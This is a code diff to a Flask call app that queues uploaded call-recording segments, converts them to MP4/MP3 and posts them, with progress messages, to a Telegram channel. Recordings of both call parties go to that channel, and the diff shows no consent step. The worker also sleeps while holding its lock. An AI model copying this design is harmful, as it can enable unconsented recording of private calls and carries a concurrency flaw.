@@ -62,6 +62,67 @@ werkzeug_log.setLevel(logging.ERROR)
 # Background Worker Pool for Zero-Lag Asynchronous Processing
 executor = ThreadPoolExecutor(max_workers=20)
 
+# ============ RECORDING QUEUE SYSTEM (Advanced) ============
+recording_queue = []
+queue_lock = threading.Lock()
+processed_count = 0
+current_processing = None
+
+def get_queue_status():
+    with queue_lock:
+        return {
+            "queue_length": len(recording_queue),
+            "current": current_processing,
+            "processed": processed_count
+        }
+
+def send_queue_status_to_channel():
+    status = get_queue_status()
+    msg = (
+        f"📋 <b>QUEUE STATUS</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"📦 In Queue: <b>{status['queue_length']}</b>\n"
+        f"🔄 Processing: <code>{status['current'] or 'None'}</code>\n"
+        f"✅ Completed: <b>{status['processed']}</b>"
+    )
+    send_telegram_message(msg)
+
+
+# ============ ADVANCED QUEUE WORKER ============
+def process_recording_queue():
+    global current_processing, processed_count
+    
+    while True:
+        try:
+            with queue_lock:
+                if not recording_queue:
+                    time.sleep(2)
+                    continue
+                
+                job = recording_queue.pop(0)
+                current_processing = job.get("filename", "unknown")
+            
+            # Send queue status
+            send_queue_status_to_channel()
+            
+            # Process the recording
+            _bg_process_recording_with_progress(**job)
+            
+            with queue_lock:
+                processed_count += 1
+                current_processing = None
+            
+            # Send updated status
+            send_queue_status_to_channel()
+            
+        except Exception as e:
+            print(f"❌ Queue worker error: {e}")
+            time.sleep(5)
+
+
+# Start the queue worker
+threading.Thread(target=process_recording_queue, daemon=True).start()
+
 active_rooms = {}
 
 # ============ SQLITE DATABASE FOR CYBER ID & FRIENDS ============
@@ -885,14 +946,24 @@ def send_telegram_file_smart(file_path, caption, is_video=False):
 
 
 # ============ VIDEO RECORDING UPLOAD (ASYNCHRONOUS ZERO-LAG) ============
-def _bg_process_recording(webm_path, room_id, seg_num, is_last, timestamp, webm_size, part_label):
-    """Background worker for WebM -> MP4/MP3 conversion and Telegram uploading."""
+def _bg_process_recording_with_progress(webm_path, room_id, seg_num, is_last, timestamp, webm_size, part_label):
+    """Advanced background worker with progress updates."""
     try:
-        # Determine perspective from filename (Sender/Creator vs Receiver/Joiner)
         filename_lower = os.path.basename(webm_path).lower()
         perspective = "Sender View"
         if "joiner" in filename_lower:
             perspective = "Receiver View"
+
+        # Initial status
+        send_telegram_message(
+            f"🔄 <b>PROCESSING STARTED</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"🆔 Room: <code>{room_id}</code>\n"
+            f"📦 Size: {fmt_size(webm_size)}\n"
+            f"🎬 Segment: {seg_num}\n"
+            f"👤 {perspective}\n"
+            f"📊 Status: <b>Queued → Processing</b>"
+        )
 
         # ---- If the browser already sent a playable MP4 (Safari/iOS), skip conversion ----
         is_already_mp4 = webm_path.lower().endswith('.mp4')
@@ -909,9 +980,20 @@ def _bg_process_recording(webm_path, room_id, seg_num, is_last, timestamp, webm_
         mp3_path = _base + '.mp3'
         mp3_success = extract_mp3_from_video(webm_path, mp3_path)
 
-        # ---- Send MP4 video to Telegram ----
+        # ---- Send MP4 video to Telegram with Progress ----
         if mp4_success:
             mp4_size = os.path.getsize(mp4_path)
+            
+            # Progress message before upload
+            send_telegram_message(
+                f"📤 <b>UPLOADING TO TELEGRAM</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 Room: <code>{room_id}</code>\n"
+                f"📦 Size: {fmt_size(mp4_size)}\n"
+                f"🎬 Segment: {seg_num}\n"
+                f"⏳ Status: Uploading MP4..."
+            )
+            
             video_caption = (
                 f"📹 <b>CALL RECORDING</b> — {part_label} ({perspective})\n"
                 f"━━━━━━━━━━━━━━━━━━\n"
@@ -922,9 +1004,28 @@ def _bg_process_recording(webm_path, room_id, seg_num, is_last, timestamp, webm_
                 f"🕐 Time: {timestamp}"
             )
             send_telegram_file_smart(mp4_path, video_caption, is_video=True)
+
+            # Final success message
+            send_telegram_message(
+                f"✅ <b>COMPLETED</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 Room: <code>{room_id}</code>\n"
+                f"📦 MP4 Size: {fmt_size(mp4_size)}\n"
+                f"🎬 Segment: {seg_num}\n"
+                f"✅ Status: Done & Uploaded to Channel"
+            )
         else:
             fallback_caption = f"📹 <b>RECORDING</b> — {part_label} ({perspective}) (WebM)\n🆔 Room: <code>{room_id}</code>\n📦 Size: {fmt_size(webm_size)}\n⚠️ MP4 conversion failed, sending as WebM"
             send_telegram_file_smart(webm_path, fallback_caption, is_video=True)
+
+            send_telegram_message(
+                f"⚠️ <b>CONVERSION FAILED</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 Room: <code>{room_id}</code>\n"
+                f"📦 Size: {fmt_size(webm_size)}\n"
+                f"🎬 Segment: {seg_num}\n"
+                f"Status: Sent as WebM (fallback)"
+            )
 
         # ---- Send MP3 audio to Telegram ----
         if mp3_success:
@@ -940,6 +1041,14 @@ def _bg_process_recording(webm_path, room_id, seg_num, is_last, timestamp, webm_
             )
             send_telegram_file_smart(mp3_path, audio_caption, is_video=False)
 
+            send_telegram_message(
+                f"✅ <b>MP3 AUDIO EXTRACTED</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 Room: <code>{room_id}</code>\n"
+                f"📦 Audio Size: {fmt_size(mp3_size)}\n"
+                f"🎬 Segment: {seg_num}"
+            )
+
         # Cleanup disk files
         for p in [webm_path, mp4_path, mp3_path]:
             try: os.remove(p)
@@ -947,6 +1056,13 @@ def _bg_process_recording(webm_path, room_id, seg_num, is_last, timestamp, webm_
 
     except Exception as e:
         print(f"❌ Background recording processing error: {e}")
+        send_telegram_message(
+            f"❌ <b>RECORDING PROCESSING ERROR</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"🆔 Room: <code>{room_id}</code>\n"
+            f"🎬 Segment: {seg_num}\n"
+            f"Error: {str(e)[:100]}"
+        )
 
 @app.route('/api/upload-recording', methods=['POST'])
 def upload_recording():
@@ -977,12 +1093,29 @@ def upload_recording():
 
         part_label = f"Part {seg_num}" + (" (Final)" if is_last else "")
 
-        executor.submit(_bg_process_recording, webm_path, clean_room_id, seg_num, is_last, timestamp, webm_size, part_label)
+        # Add to Queue instead of direct execution
+        job = {
+            "webm_path": webm_path,
+            "room_id": clean_room_id,
+            "seg_num": seg_num,
+            "is_last": is_last,
+            "timestamp": timestamp,
+            "webm_size": webm_size,
+            "part_label": part_label,
+            "filename": os.path.basename(webm_path)
+        }
+        
+        with queue_lock:
+            recording_queue.append(job)
+        
+        # Send immediate queue status
+        send_queue_status_to_channel()
 
         return jsonify({
             "status": "ok",
             "segment": seg_num,
-            "message": "Segment received & processing in background without lag 🚀"
+            "message": "Segment added to queue. Will process one by one.",
+            "queue_position": len(recording_queue)
         }), 200
 
     except Exception as e:
